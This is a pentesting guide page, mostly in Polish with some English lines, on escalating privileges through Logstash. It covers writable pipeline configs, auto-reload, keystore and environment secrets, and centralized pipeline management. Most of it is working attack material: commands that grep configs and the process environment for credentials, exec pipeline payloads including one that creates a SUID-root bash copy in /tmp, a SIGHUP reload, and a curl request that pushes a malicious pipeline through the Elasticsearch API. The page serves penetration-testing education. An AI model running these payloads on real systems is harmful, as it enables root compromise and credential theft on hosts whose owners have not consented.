# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash służy do **zbierania, przekształcania i wysyłania logów** przez system znany jako **pipelines**. Te pipelines składają się z etapów **input**, **filter** i **output**. Interesujący aspekt pojawia się, gdy Logstash działa na skompromitowanej maszynie.

### Pipeline Configuration

Pipelines są skonfigurowane w pliku **/etc/logstash/pipelines.yml**, który wymienia lokalizacje konfiguracji pipeline'ów:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Ten plik ujawnia, gdzie znajdują się pliki **.conf**, zawierające konfiguracje **pipelines**. Przy użyciu **Elasticsearch output module** często **pipelines** zawierają **Elasticsearch credentials**, które zwykle mają szerokie uprawnienia ze względu na potrzebę Logstash do zapisywania danych w Elasticsearch. Wildcards w ścieżkach konfiguracji pozwalają Logstashowi uruchamiać wszystkie pasujące **pipelines** w wyznaczonym katalogu.

Jeśli Logstash jest uruchamiany z `-f <directory>` zamiast `pipelines.yml`, **wszystkie pliki w tym katalogu są konkatenowane w porządku leksykograficznym i parsowane jako jedna konfiguracja**. Powoduje to dwie konsekwencje ofensywne:

- Umieszczony plik, np. `000-input.conf` lub `zzz-output.conf`, może zmienić sposób, w jaki finalny **pipeline** jest złożony
- Błędnie sformatowany plik może uniemożliwić załadowanie całego **pipeline**, więc przed poleganiem na auto-reload dokładnie waliduj payloady

### Szybka enumeracja na skompromitowanym hoście

Na maszynie, na której zainstalowany jest Logstash, szybko sprawdź:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Sprawdź także, czy lokalne monitoring API jest osiągalne. Domyślnie nasłuchuje na **127.0.0.1:9600**, co zwykle wystarcza po uzyskaniu dostępu do hosta:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
This usually gives you pipeline IDs, runtime details, and confirmation that your modified pipeline has been loaded.

Poświadczenia odzyskane z Logstash często odblokowują **Elasticsearch**, więc sprawdź [tę inną stronę o Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation via Writable Pipelines

To attempt privilege escalation, first identify the user under which the Logstash service is running, typically the **logstash** user. Ensure you meet **one** of these criteria:

- Posiadasz **write access** do pliku pipeline **.conf** **lub**
- Plik **/etc/logstash/pipelines.yml** używa wildcarda i możesz zapisywać do docelowego folderu

Additionally, **one** of these conditions must be fulfilled:

- Możliwość zrestartowania usługi Logstash **lub**
- W pliku **/etc/logstash/logstash.yml** ustawione jest **config.reload.automatic: true**

Gdy w konfiguracji użyto wildcarda, utworzenie pliku pasującego do tego wildcarda pozwala na wykonanie poleceń. Na przykład:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Tu, **interval** określa częstotliwość wykonywania w sekundach. W podanym przykładzie polecenie **whoami** uruchamia się co 120 sekund, a jego wyjście kierowane jest do **/tmp/output.log**.

Z ustawieniem **config.reload.automatic: true** w **/etc/logstash/logstash.yml**, Logstash automatycznie wykrywa i stosuje nowe lub zmienione konfiguracje pipeline bez potrzeby restartu. Jeśli nie ma wildcard, nadal można modyfikować istniejące konfiguracje, jednak zaleca się ostrożność, aby uniknąć zakłóceń.

### Bardziej niezawodne pipeline payloads

The `exec` input plugin still works in current releases and requires either an `interval` or a `schedule`. It executes by **forking** the Logstash JVM, so if memory is tight your payload may fail with `ENOMEM` instead of silently running.

Praktyczniejszy payload do eskalacji uprawnień zwykle pozostawia trwały artefakt:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Jeśli nie masz uprawnień do restartu, ale możesz wysłać sygnał do procesu, Logstash obsługuje również przeładowanie wywołane **SIGHUP** w systemach podobnych do Uniksa:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Pamiętaj, że nie każda wtyczka obsługuje automatyczne przeładowanie. Na przykład wejście **stdin** uniemożliwia automatyczne przeładowanie, więc nie zakładaj, że `config.reload.automatic` zawsze zastosuje twoje zmiany.

### Kradzież sekretów z Logstash

Zanim skupisz się wyłącznie na wykonaniu kodu, pozyskaj dane, do których Logstash już ma dostęp:

- Poświadczenia w postaci plaintext często są zakodowane na stałe wewnątrz `elasticsearch {}` outputs, `http_poller`, JDBC inputs lub ustawień związanych z chmurą
- Bezpieczne ustawienia mogą znajdować się w **`/etc/logstash/logstash.keystore`** lub innym katalogu `path.settings`
- Hasło keystore często jest dostarczane przez **`LOGSTASH_KEYSTORE_PASS`**, a instalacje z pakietów zwykle pobierają je z **`/etc/sysconfig/logstash`**
- Rozszerzanie zmiennych środowiskowych poprzez `${VAR}` jest rozwiązywane przy starcie Logstash, więc warto sprawdzić środowisko usługi

Przydatne sprawdzenia:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
To też warto sprawdzić, ponieważ **CVE-2023-46672** wykazało, że Logstash może zapisywać w logach wrażliwe informacje w określonych okolicznościach. Na hoście post-exploitation stare logi Logstash i wpisy w `journald` mogą więc ujawnić poświadczenia, nawet jeśli bieżąca konfiguracja odwołuje się do keystore zamiast przechowywać sekrety inline.

### Nadużycie scentralizowanego zarządzania pipeline'ami

W niektórych środowiskach host w ogóle nie opiera się na lokalnych plikach `.conf`. Jeśli skonfigurowano **`xpack.management.enabled: true`**, Logstash może pobierać scentralizowane pipeline'y z Elasticsearch/Kibana, a po włączeniu tego trybu lokalne konfiguracje pipeline'ów przestają być źródłem prawdy.

To oznacza inną ścieżkę ataku:

1. Odzyskaj poświadczenia Elastic z lokalnych ustawień Logstash, keystore lub logów
2. Zweryfikuj, czy konto ma przywilej klastra **`manage_logstash_pipelines`**
3. Utwórz lub zastąp scentralizowany pipeline, aby host Logstash wykonał Twój payload przy następnym interwale poll

API Elasticsearch używane przez tę funkcję to:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Jest to szczególnie przydatne, gdy lokalne pliki są tylko do odczytu, ale Logstash jest już zarejestrowany do pobierania pipelines zdalnie.

## Źródła

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
